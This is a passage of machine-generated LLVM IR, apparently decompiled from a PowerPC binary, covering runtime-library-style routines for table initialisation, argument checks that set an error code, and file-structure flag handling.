  %v3_1000b404 = load i32, i32* @global_var_100104d0.321, align 4
  %v3_1000b408 = icmp eq i32 %v3_1000b404, 0
  br i1 %v3_1000b408, label %dec_label_pc_1000b410, label %dec_label_pc_1000b438

dec_label_pc_1000b410:                            ; preds = %dec_label_pc_1000b400
  store i32 1, i32* @global_var_100104d0.321, align 4
  br label %dec_label_pc_1000b418

dec_label_pc_1000b418:                            ; preds = %dec_label_pc_1000b494, %dec_label_pc_1000b410
  store i32 ptrtoint (i32* @global_var_100103f8.319 to i32), i32* %r29.global-to-local, align 4
  %v0_1000b424 = call i32 @function_10008c78()
  store i32 268481584, i32* @lr, align 4
  %v1_1000b42c = call i32 @function_1000c9bc(i32 6)
  %v0_1000b434 = call i32 @function_10008c78()
  %v3_1000b43c.pre = load i32, i32* @global_var_100104d0.321, align 4
  br label %dec_label_pc_1000b438

dec_label_pc_1000b438:                            ; preds = %dec_label_pc_1000b400, %dec_label_pc_1000b418
  %v0_1000b4b0 = phi i32 [ %v3_1000b404, %dec_label_pc_1000b400 ], [ %v3_1000b43c.pre, %dec_label_pc_1000b418 ]
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_1000b440 = icmp eq i32 %v0_1000b4b0, 1
  br i1 %v3_1000b440, label %dec_label_pc_1000b480.lr.ph, label %dec_label_pc_1000b4b0

dec_label_pc_1000b480.lr.ph:                      ; preds = %dec_label_pc_1000b438
  %v2_1000b44c = ptrtoint i32* %stack_var_-168 to i32
  store i32 2, i32* @global_var_100104d0.321, align 4
  store i32 ptrtoint (i32* @global_var_1000b460.323 to i32), i32* @lr, align 4
  %v3_1000b45c = call i32 @function_10006e24(i32 %v2_1000b44c, i32 0, i32 140)
  store i32 %v2_1000b3ac, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000b48424 = add i32 %v2_1000b3ac, 124
  store i32 %v2_1000b48424, i32* %r9.global-to-local, align 4
  %v2_1000b48825 = add i32 %v2_1000b3ac, 256
  %v3_1000b48826 = inttoptr i32 %v2_1000b48825 to i32*
  store i32 -1, i32* %v3_1000b48826, align 4
  %v0_1000b48c27 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b48c28 = add i32 %v0_1000b48c27, -1
  store i32 %v1_1000b48c28, i32* %r11.global-to-local, align 4
  %v0_1000b49029 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b49030 = add i32 %v0_1000b49029, -1
  store i32 %v1_1000b49030, i32* %ctr.global-to-local, align 4
  %v2_1000b49031 = icmp eq i32 %v1_1000b49030, 0
  br i1 %v2_1000b49031, label %dec_label_pc_1000b494, label %dec_label_pc_1000b480.dec_label_pc_1000b480_crit_edge

dec_label_pc_1000b480.dec_label_pc_1000b480_crit_edge: ; preds = %dec_label_pc_1000b480.lr.ph, %dec_label_pc_1000b480.dec_label_pc_1000b480_crit_edge
  %v1_1000b48c32 = phi i32 [ %v1_1000b48c, %dec_label_pc_1000b480.dec_label_pc_1000b480_crit_edge ], [ %v1_1000b48c28, %dec_label_pc_1000b480.lr.ph ]
  %v1_1000b484.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_1000b488.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_1000b480 = mul i32 %v1_1000b48c32, 4
  %v2_1000b484 = add i32 %v1_1000b480, %v1_1000b484.pre
  store i32 %v2_1000b484, i32* %r9.global-to-local, align 4
  %v2_1000b488 = add i32 %v2_1000b484, 132
  %v3_1000b488 = inttoptr i32 %v2_1000b488 to i32*
  store i32 %v0_1000b488.pre, i32* %v3_1000b488, align 4
  %v0_1000b48c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b48c = add i32 %v0_1000b48c, -1
  store i32 %v1_1000b48c, i32* %r11.global-to-local, align 4
  %v0_1000b490 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b490 = add i32 %v0_1000b490, -1
  store i32 %v1_1000b490, i32* %ctr.global-to-local, align 4
  %v2_1000b490 = icmp eq i32 %v1_1000b490, 0
  br i1 %v2_1000b490, label %dec_label_pc_1000b494, label %dec_label_pc_1000b480.dec_label_pc_1000b480_crit_edge

dec_label_pc_1000b494:                            ; preds = %dec_label_pc_1000b480.dec_label_pc_1000b480_crit_edge, %dec_label_pc_1000b480.lr.ph
  store i32 268481708, i32* @lr, align 4
  %v4_1000b4a8 = call i32 @function_1000b25c(i32 6, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_1000b418

dec_label_pc_1000b4b0:                            ; preds = %dec_label_pc_1000b438
  %v3_1000b4b0 = icmp eq i32 %v0_1000b4b0, 2
  br i1 %v3_1000b4b0, label %dec_label_pc_1000b4b8, label %dec_label_pc_1000b4c4

dec_label_pc_1000b4b8:                            ; preds = %dec_label_pc_1000b4b0
  store i32 3, i32* @global_var_100104d0.321, align 4
  br label %dec_label_pc_1000b4c4

dec_label_pc_1000b4c4:                            ; preds = %dec_label_pc_1000b4b0, %dec_label_pc_1000b4b8
  %v3_1000b4c4 = phi i32 [ %v0_1000b4b0, %dec_label_pc_1000b4b0 ], [ 3, %dec_label_pc_1000b4b8 ]
  %v1_1000b4cc = icmp ne i32 %v3_1000b4c4, 3
  call void @__pseudo_cond_branch(i1 %v1_1000b4cc, i32 268481760)
  store i32 4, i32* @global_var_100104d0.321, align 4
  %v1_1000b4dc = call i32 @function_10009110(i32 127)
  ret i32 %v1_1000b4dc

; uselistorder directives
  uselistorder i32 %v1_1000b490, { 1, 0 }
  uselistorder i32 %v1_1000b48c, { 1, 0 }
  uselistorder i32 %v1_1000b3d8, { 1, 0 }
  uselistorder i32 %v1_1000b3d4, { 0, 2, 1 }
  uselistorder i32 %v2_1000b3ac, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32* %r9.global-to-local, { 4, 0, 5, 6, 8, 7, 1, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32* %ctr.global-to-local, { 7, 6, 0, 2, 3, 9, 8, 1, 4, 5 }
  uselistorder i32 (i32)* @function_10009110, { 1, 0, 2 }
  uselistorder i32 127, { 1, 4, 0, 3, 5, 2 }
  uselistorder i32 (i32, i32*, i32)* @function_1000b25c, { 1, 0 }
  uselistorder i32 132, { 3, 1, 2, 0 }
  uselistorder i32* @global_var_100104d0.321, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @function_1000948c, { 0, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_1000b348, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000b4c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b480.dec_label_pc_1000b480_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000b438, { 1, 0 }
  uselistorder label %dec_label_pc_1000b400, { 1, 0 }
  uselistorder label %dec_label_pc_1000b3cc.dec_label_pc_1000b3cc_crit_edge, { 1, 0 }
}

define i32 @function_1000b4e8(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000b4e8:
  %v1_1000b4e8 = add i32 %arg1, 28
  %v2_1000b4e8 = inttoptr i32 %v1_1000b4e8 to i32*
  %v3_1000b4e8 = load i32, i32* %v2_1000b4e8, align 4
  store i32 %v3_1000b4e8, i32* @global_var_100104d4.324, align 4
  %v1_1000b4f8 = add i32 %arg1, 44
  %v2_1000b4f8 = inttoptr i32 %v1_1000b4f8 to i32*
  %v3_1000b4f8 = load i32, i32* %v2_1000b4f8, align 4
  store i32 %v3_1000b4f8, i32* @global_var_100104d8.325, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @function_1000b504() local_unnamed_addr {
dec_label_pc_1000b504:
  %v0_1000b510 = load i32, i32* @r3, align 4
  store i32 %v0_1000b510, i32* @r29, align 4
  %v0_1000b518 = call i32 @function_10004b48()
  %v0_1000b51c = load i32, i32* @r29, align 4
  %v2_1000b51c = inttoptr i32 %v0_1000b518 to i32*
  store i32 %v0_1000b51c, i32* %v2_1000b51c, align 4
  ret i32 -1
}

define i32 @function_1000b538(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000b538:
  store i32 %arg1, i32* @global_var_100104dc.287, align 4
  %v0_1000b560 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 true, i32 %v0_1000b560)
  store i32 12, i32* @r3, align 4
  %v0_1000b568 = call i32 @function_1000b504()
  ret i32 %v0_1000b568

; uselistorder directives
  uselistorder i32 ()* @function_1000b504, { 1, 0 }
  uselistorder i32* @global_var_100104dc.287, { 1, 0, 2 }
}

define i32 @function_1000b56c() local_unnamed_addr {
dec_label_pc_1000b56c:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000b584 = call i32 @__asm_mfcr()
  %v1_1000b588 = and i32 %v0_1000b584, 268435456
  %v3_1000b588 = icmp eq i32 %v1_1000b588, 0
  store i32 %v0_1000b584, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b588, label %dec_label_pc_1000b5a0, label %dec_label_pc_1000b594

dec_label_pc_1000b594:                            ; preds = %dec_label_pc_1000b56c
  %v0_1000b594 = call i32 @function_10004b48()
  %v0_1000b598 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b598 = inttoptr i32 %v0_1000b594 to i32*
  store i32 %v0_1000b598, i32* %v2_1000b598, align 4
  br label %dec_label_pc_1000b5a0

dec_label_pc_1000b5a0:                            ; preds = %dec_label_pc_1000b56c, %dec_label_pc_1000b594
  %v0_1000b5b0 = phi i32 [ %v0_1000b584, %dec_label_pc_1000b56c ], [ -1, %dec_label_pc_1000b594 ]
  ret i32 %v0_1000b5b0

; uselistorder directives
  uselistorder label %dec_label_pc_1000b5a0, { 1, 0 }
}

define i32 @function_1000b5b4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000b5b4:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000b5cc = call i32 @__asm_mfcr()
  %v1_1000b5d0 = and i32 %v0_1000b5cc, 268435456
  %v3_1000b5d0 = icmp eq i32 %v1_1000b5d0, 0
  store i32 %v0_1000b5cc, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b5d0, label %dec_label_pc_1000b5e8, label %dec_label_pc_1000b5dc

dec_label_pc_1000b5dc:                            ; preds = %dec_label_pc_1000b5b4
  %v0_1000b5dc = call i32 @function_10004b48()
  %v0_1000b5e0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b5e0 = inttoptr i32 %v0_1000b5dc to i32*
  store i32 %v0_1000b5e0, i32* %v2_1000b5e0, align 4
  br label %dec_label_pc_1000b5e8

dec_label_pc_1000b5e8:                            ; preds = %dec_label_pc_1000b5b4, %dec_label_pc_1000b5dc
  %v0_1000b5f8 = phi i32 [ %v0_1000b5cc, %dec_label_pc_1000b5b4 ], [ -1, %dec_label_pc_1000b5dc ]
  ret i32 %v0_1000b5f8

; uselistorder directives
  uselistorder label %dec_label_pc_1000b5e8, { 1, 0 }
}

define i32 @function_1000b5fc(i16* %arg1) local_unnamed_addr {
dec_label_pc_1000b5fc:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_1000b5fc = load i32, i32* @r5, align 4
  %v0_1000b600 = load i32, i32* @r4, align 4
  %tmp10 = icmp slt i32 %v0_1000b600, 0
  %v1_1000b604 = zext i1 %tmp10 to i32
  %v2_1000b604 = ashr i32 %v0_1000b600, 31
  %v3_1000b604 = and i32 %v2_1000b604, -2
  %v4_1000b604 = or i32 %v3_1000b604, %v1_1000b604
  %v0_1000b610 = load i32, i32* @lr, align 4
  store i32 %v0_1000b610, i32* %r0.global-to-local, align 4
  store i32 %v0_1000b5fc, i32* @r30, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %v4_1000b604, i32* %stack_var_-56, align 4
  %tmp9 = icmp ult i32 %v0_1000b5fc, 3
  br i1 %tmp9, label %dec_label_pc_1000b648, label %dec_label_pc_1000b634

dec_label_pc_1000b634:                            ; preds = %dec_label_pc_1000b5fc
  %v0_1000b634 = call i32 @function_10004b48()
  store i32 -1, i32* @r30, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1000b640 = inttoptr i32 %v0_1000b634 to i32*
  store i32 22, i32* %v2_1000b640, align 4
  br label %dec_label_pc_1000b710

dec_label_pc_1000b648:                            ; preds = %dec_label_pc_1000b5fc
  %v2_1000b648 = add i32 %tmp, 52
  %v3_1000b648 = inttoptr i32 %v2_1000b648 to i32*
  %v4_1000b648 = load i32, i32* %v3_1000b648, align 4
  store i32 %v4_1000b648, i32* @r28, align 4
  %v3_1000b64c = icmp eq i32 %v4_1000b648, 0
  br i1 %v3_1000b64c, label %dec_label_pc_1000b654, label %dec_label_pc_1000b674

dec_label_pc_1000b654:                            ; preds = %dec_label_pc_1000b648
  %v2_1000b654 = add i32 %tmp, 56
  store i32 %v2_1000b654, i32* @r29, align 4
  %v2_1000b65c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000b65c, i32* @r3, align 4
  %v0_1000b668 = call i32 @function_10008c80()
  %v0_1000b670 = call i32 @function_10008c78()
  %v0_1000b674.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000b674

dec_label_pc_1000b674:                            ; preds = %dec_label_pc_1000b648, %dec_label_pc_1000b654
  %v0_1000b680 = phi i32 [ %tmp, %dec_label_pc_1000b648 ], [ %v0_1000b674.pre, %dec_label_pc_1000b654 ]
  %v1_1000b674 = inttoptr i32 %v0_1000b680 to i16*
  %v2_1000b674 = load i16, i16* %v1_1000b674, align 2
  %v3_1000b674 = zext i16 %v2_1000b674 to i32
  store i32 %v3_1000b674, i32* %r0.global-to-local, align 4
  %v1_1000b678 = and i32 %v3_1000b674, 64
  store i32 %v1_1000b678, i32* %r9.global-to-local, align 4
  %v3_1000b678 = icmp eq i32 %v1_1000b678, 0
  br i1 %v3_1000b678, label %dec_label_pc_1000b690, label %dec_label_pc_1000b680

dec_label_pc_1000b680:                            ; preds = %dec_label_pc_1000b674
  store i32 %v0_1000b680, i32* @r3, align 4
  store i32 268482184, i32* @lr, align 4
  %v0_1000b684 = call i32 @function_10005548()
  %v3_1000b688 = icmp eq i32 %v0_1000b684, 0
  br i1 %v3_1000b688, label %dec_label_pc_1000b690, label %dec_label_pc_1000b6f8

dec_label_pc_1000b690:                            ; preds = %dec_label_pc_1000b680, %dec_label_pc_1000b674
  %v0_1000b690 = load i32, i32* @r30, align 4
  %v3_1000b690 = icmp eq i32 %v0_1000b690, 1
  br i1 %v3_1000b690, label %dec_label_pc_1000b698, label %dec_label_pc_1000b690.dec_label_pc_1000b6ac_crit_edge

dec_label_pc_1000b690.dec_label_pc_1000b6ac_crit_edge: ; preds = %dec_label_pc_1000b690
  br label %dec_label_pc_1000b6ac

dec_label_pc_1000b698:                            ; preds = %dec_label_pc_1000b690
  %v0_1000b698 = load i32, i32* @r31, align 4
  %v1_1000b698 = inttoptr i32 %v0_1000b698 to i16*
  %v2_1000b69c = ptrtoint i32* %stack_var_-56 to i32
  store i32 268482212, i32* @lr, align 4
  %v4_1000b6a0 = call i32 @function_1000b79c(i16* %v1_1000b698, i32 %v2_1000b69c)
  %v1_1000b6a4 = icmp slt i32 %v4_1000b6a0, 0
  br i1 %v1_1000b6a4, label %dec_label_pc_1000b6f8, label %dec_label_pc_1000b698.dec_label_pc_1000b6ac_crit_edge

dec_label_pc_1000b698.dec_label_pc_1000b6ac_crit_edge: ; preds = %dec_label_pc_1000b698
  %v0_1000b6ac.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000b6ac

dec_label_pc_1000b6ac:                            ; preds = %dec_label_pc_1000b690.dec_label_pc_1000b6ac_crit_edge, %dec_label_pc_1000b698.dec_label_pc_1000b6ac_crit_edge
  %v0_1000b6ac = phi i32 [ %v0_1000b690, %dec_label_pc_1000b690.dec_label_pc_1000b6ac_crit_edge ], [ %v0_1000b6ac.pre, %dec_label_pc_1000b698.dec_label_pc_1000b6ac_crit_edge ]
  %v0_1000b6b0 = load i32, i32* @r31, align 4
  store i32 268482236, i32* @lr, align 4
  %v5_1000b6b8 = call i32 @function_1000b984(i32 %v0_1000b6b0, i32* nonnull %stack_var_-56, i32 %v0_1000b6ac)
  %v1_1000b6bc = icmp slt i32 %v5_1000b6b8, 0
  br i1 %v1_1000b6bc, label %dec_label_pc_1000b6f8, label %dec_label_pc_1000b6c4

dec_label_pc_1000b6c4:                            ; preds = %dec_label_pc_1000b6ac
  %v0_1000b6c4 = load i32, i32* @r31, align 4
  %v1_1000b6c4 = inttoptr i32 %v0_1000b6c4 to i16*
  %v2_1000b6c4 = load i16, i16* %v1_1000b6c4, align 2
  %v3_1000b6c4 = zext i16 %v2_1000b6c4 to i32
  store i32 %v3_1000b6c4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_1000b6cc = add i32 %v0_1000b6c4, 8
  %v2_1000b6cc = inttoptr i32 %v1_1000b6cc to i32*
  %v3_1000b6cc = load i32, i32* %v2_1000b6cc, align 4
  store i32 %v3_1000b6cc, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v3_1000b6d4 = add i32 %v0_1000b6c4, 2
  %v4_1000b6d4 = inttoptr i32 %v3_1000b6d4 to i8*
  store i8 0, i8* %v4_1000b6d4, align 1
  %v0_1000b6d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b6d8 = and i32 %v0_1000b6d8, 65464
  store i32 %v1_1000b6d8, i32* %r0.global-to-local, align 4
  %v0_1000b6dc = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b6dc = load i32, i32* @r31, align 4
  %v2_1000b6dc = add i32 %v1_1000b6dc, 44
  %v3_1000b6dc = inttoptr i32 %v2_1000b6dc to i32*
  store i32 %v0_1000b6dc, i32* %v3_1000b6dc, align 4
  %v0_1000b6e0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b6e0 = load i32, i32* @r31, align 4
  %v2_1000b6e0 = add i32 %v1_1000b6e0, 28
  %v3_1000b6e0 = inttoptr i32 %v2_1000b6e0 to i32*
  store i32 %v0_1000b6e0, i32* %v3_1000b6e0, align 4
  %v0_1000b6e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b6e4 = trunc i32 %v0_1000b6e4 to i16
  %v2_1000b6e4 = load i32, i32* @r31, align 4
  %v3_1000b6e4 = inttoptr i32 %v2_1000b6e4 to i16*
  store i16 %v1_1000b6e4, i16* %v3_1000b6e4, align 2
  %v0_1000b6e8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b6e8 = load i32, i32* @r31, align 4
  %v2_1000b6e8 = add i32 %v1_1000b6e8, 16
  %v3_1000b6e8 = inttoptr i32 %v2_1000b6e8 to i32*
  store i32 %v0_1000b6e8, i32* %v3_1000b6e8, align 4
  %v0_1000b6ec = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b6ec = load i32, i32* @r31, align 4
  %v2_1000b6ec = add i32 %v1_1000b6ec, 20
  %v3_1000b6ec = inttoptr i32 %v2_1000b6ec to i32*
  store i32 %v0_1000b6ec, i32* %v3_1000b6ec, align 4
  %v0_1000b6f0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b6f0 = load i32, i32* @r31, align 4
  %v2_1000b6f0 = add i32 %v1_1000b6f0, 24
  %v3_1000b6f0 = inttoptr i32 %v2_1000b6f0 to i32*
  store i32 %v0_1000b6f0, i32* %v3_1000b6f0, align 4
  br label %dec_label_pc_1000b6fc

dec_label_pc_1000b6f8:                            ; preds = %dec_label_pc_1000b680, %dec_label_pc_1000b6ac, %dec_label_pc_1000b698
  store i32 -1, i32* @r30, align 4
  br label %dec_label_pc_1000b6fc

dec_label_pc_1000b6fc:                            ; preds = %dec_label_pc_1000b6c4, %dec_label_pc_1000b6f8
  %v0_1000b6fc = load i32, i32* @r28, align 4
  %v3_1000b6fc = icmp eq i32 %v0_1000b6fc, 0
  br i1 %v3_1000b6fc, label %dec_label_pc_1000b704, label %dec_label_pc_1000b710

dec_label_pc_1000b704:                            ; preds = %dec_label_pc_1000b6fc
  %v2_1000b704 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000b704, i32* @r3, align 4
  %v0_1000b70c = call i32 @function_10008c80()
  br label %dec_label_pc_1000b710

dec_label_pc_1000b710:                            ; preds = %dec_label_pc_1000b6fc, %dec_label_pc_1000b634, %dec_label_pc_1000b704
  store i32 %v0_1000b610, i32* %r0.global-to-local, align 4
  %v0_1000b714 = load i32, i32* @r30, align 4
  ret i32 %v0_1000b714

; uselistorder directives
  uselistorder i32 %v0_1000b600, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32 ()* @function_10008c78, { 6, 4, 3, 2, 38, 37, 36, 35, 34, 33, 0, 39, 31, 30, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 32, 29, 28, 27, 26, 25, 5, 24, 43, 1, 23, 22, 42, 41, 40, 21, 20, 19 }
  uselistorder i32 ()* @function_10008c80, { 5, 4, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 1, 0, 49, 48, 33, 32, 31, 30, 7, 6, 35, 34, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 3, 2, 19, 18, 57, 56, 17, 16, 15, 14, 55, 54, 53, 52, 51, 50, 13, 12, 11, 10, 9, 8 }
  uselistorder i32 56, { 3, 5, 1, 4, 0, 2 }
  uselistorder i32 52, { 8, 9, 11, 2, 5, 1, 10, 6, 7, 0, 3, 4 }
  uselistorder i32 22, { 1, 13, 2, 9, 3, 10, 11, 4, 15, 5, 14, 6, 0, 12, 7, 8 }
  uselistorder label %dec_label_pc_1000b710, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b6fc, { 1, 0 }
  uselistorder label %dec_label_pc_1000b6f8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000b6ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000b674, { 1, 0 }
}

define i32 @function_1000b728(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000b728:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000b734 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000b740 = load i16, i16* %arg1, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000b748 = and i16 %v3_1000b740, 4
  %v3_1000b748 = icmp eq i16 %v1_1000b748, 0
  br i1 %v3_1000b748, label %dec_label_pc_1000b750, label %dec_label_pc_1000b788

dec_label_pc_1000b750:                            ; preds = %dec_label_pc_1000b728
  %tmp10 = icmp sgt i32 %arg2, -1
  br i1 %tmp10, label %dec_label_pc_1000b75c, label %dec_label_pc_1000b754

dec_label_pc_1000b754:                            ; preds = %dec_label_pc_1000b750
  br label %dec_label_pc_1000b75c

dec_label_pc_1000b75c:                            ; preds = %dec_label_pc_1000b750, %dec_label_pc_1000b754
  %v1_1000b75c = add i32 %tmp, 4
  %v2_1000b75c = inttoptr i32 %v1_1000b75c to i32*
  %v3_1000b75c = load i32, i32* %v2_1000b75c, align 4
  store i32 %v3_1000b75c, i32* %r3.global-to-local, align 4
  store i32 268482404, i32* @lr, align 4
  %v1_1000b760 = call i32 @function_1000ca6c(i32 %v3_1000b75c)
  store i32 %v1_1000b760, i32* %r3.global-to-local, align 4
  %v2_1000b764 = icmp sgt i32 %v1_1000b760, 0
  br i1 %v2_1000b764, label %dec_label_pc_1000b788, label %dec_label_pc_1000b76c

dec_label_pc_1000b76c:                            ; preds = %dec_label_pc_1000b75c
  %v3_1000b764 = icmp eq i32 %v1_1000b760, 0
  %v0_1000b76c = load i32, i32* @r31, align 4
  %v1_1000b76c = inttoptr i32 %v0_1000b76c to i16*
  %v2_1000b76c = load i16, i16* %v1_1000b76c, align 2
  br i1 %v3_1000b764, label %dec_label_pc_1000b774, label %dec_label_pc_1000b77c

dec_label_pc_1000b774:                            ; preds = %dec_label_pc_1000b76c
  %v1_1000b774 = or i16 %v2_1000b76c, 4
  br label %dec_label_pc_1000b784

dec_label_pc_1000b77c:                            ; preds = %dec_label_pc_1000b76c
  %v1_1000b77c = or i16 %v2_1000b76c, 8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b784

dec_label_pc_1000b784:                            ; preds = %dec_label_pc_1000b774, %dec_label_pc_1000b77c
  %v1_1000b774.sink.off0 = phi i16 [ %v1_1000b774, %dec_label_pc_1000b774 ], [ %v1_1000b77c, %dec_label_pc_1000b77c ]
  store i16 %v1_1000b774.sink.off0, i16* %v1_1000b76c, align 2
  %v0_1000b798.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b788

dec_label_pc_1000b788:                            ; preds = %dec_label_pc_1000b728, %dec_label_pc_1000b75c, %dec_label_pc_1000b784
  %v0_1000b798 = phi i32 [ 0, %dec_label_pc_1000b728 ], [ %v1_1000b760, %dec_label_pc_1000b75c ], [ %v0_1000b798.pre, %dec_label_pc_1000b784 ]
  store i32 %v0_1000b734, i32* @r31, align 4
  ret i32 %v0_1000b798

; uselistorder directives
  uselistorder i16 %v2_1000b76c, { 1, 0 }
  uselistorder i32 %v1_1000b760, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_1000b788, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b784, { 1, 0 }
  uselistorder label %dec_label_pc_1000b75c, { 1, 0 }
}

define i32 @function_1000b79c(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000b79c:
  %r10.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v3_1000b7b4 = load i16, i16* %arg1, align 2
  %v4_1000b7b4 = zext i16 %v3_1000b7b4 to i32
  %tmp9 = urem i16 %v3_1000b7b4, 4
  %v3_1000b7b8 = icmp eq i16 %tmp9, 0
  br i1 %v3_1000b7b8, label %dec_label_pc_1000b804, label %dec_label_pc_1000b7c0

dec_label_pc_1000b7c0:                            ; preds = %dec_label_pc_1000b79c
  %v1_1000b7b8 = zext i16 %tmp9 to i32
  %v1_1000b7c0 = add nsw i32 %v1_1000b7b8, -1
  store i32 %v1_1000b7c0, i32* %r10.global-to-local, align 4
  %v4_1000b7c0 = icmp eq i32 %v1_1000b7c0, 0
  br i1 %v4_1000b7c0, label %dec_label_pc_1000b804, label %dec_label_pc_1000b7c8

dec_label_pc_1000b7c8:                            ; preds = %dec_label_pc_1000b7c0
  %v1_1000b7c8 = and i32 %v4_1000b7b4, 2048
  %v3_1000b7c8 = icmp eq i32 %v1_1000b7c8, 0
  br i1 %v3_1000b7c8, label %dec_label_pc_1000b804, label %dec_label_pc_1000b7d0

dec_label_pc_1000b7d0:                            ; preds = %dec_label_pc_1000b7c8
  %v2_1000b7d0 = icmp sgt i32 %v1_1000b7c0, 1
  br i1 %v2_1000b7d0, label %dec_label_pc_1000b87c, label %dec_label_pc_1000b7d8

dec_label_pc_1000b7d8:                            ; preds = %dec_label_pc_1000b7d0
  %v2_1000b7d8 = add i32 %tmp, 40
  %v3_1000b7d8 = inttoptr i32 %v2_1000b7d8 to i32*
  %v4_1000b7d8 = load i32, i32* %v3_1000b7d8, align 4
  %v3_1000b7dc = icmp eq i32 %v4_1000b7d8, 0
  br i1 %v3_1000b7dc, label %dec_label_pc_1000b7e4, label %dec_label_pc_1000b87c

dec_label_pc_1000b7e4:                            ; preds = %dec_label_pc_1000b7d8
  %v2_1000b7e4 = add i32 %tmp, 44
  %v3_1000b7e4 = inttoptr i32 %v2_1000b7e4 to i32*
  %v4_1000b7e4 = load i32, i32* %v3_1000b7e4, align 4
  %v2_1000b7e8 = add i32 %tmp, 3
  %v3_1000b7e8 = inttoptr i32 %v2_1000b7e8 to i8*
  %v4_1000b7e8 = load i8, i8* %v3_1000b7e8, align 1
  %v5_1000b7e8 = zext i8 %v4_1000b7e8 to i32
  %v2_1000b7f0 = sub nsw i32 %v1_1000b7c0, %v5_1000b7e8
  %v1_1000b7f4 = add nsw i32 %v2_1000b7f0, -1
  store i32 %v1_1000b7f4, i32* %r10.global-to-local, align 4
  %tmp7 = icmp slt i32 %v4_1000b7e4, 1
  br i1 %tmp7, label %dec_label_pc_1000b804, label %dec_label_pc_1000b7fc

dec_label_pc_1000b7fc:                            ; preds = %dec_label_pc_1000b7e4
  %v2_1000b7fc = add i32 %tmp, 2
  %v3_1000b7fc = inttoptr i32 %v2_1000b7fc to i8*
  %v4_1000b7fc = load i8, i8* %v3_1000b7fc, align 1
  %v5_1000b7fc = zext i8 %v4_1000b7fc to i32
  %v2_1000b800 = sub nsw i32 %v1_1000b7f4, %v5_1000b7fc
  store i32 %v2_1000b800, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000b804

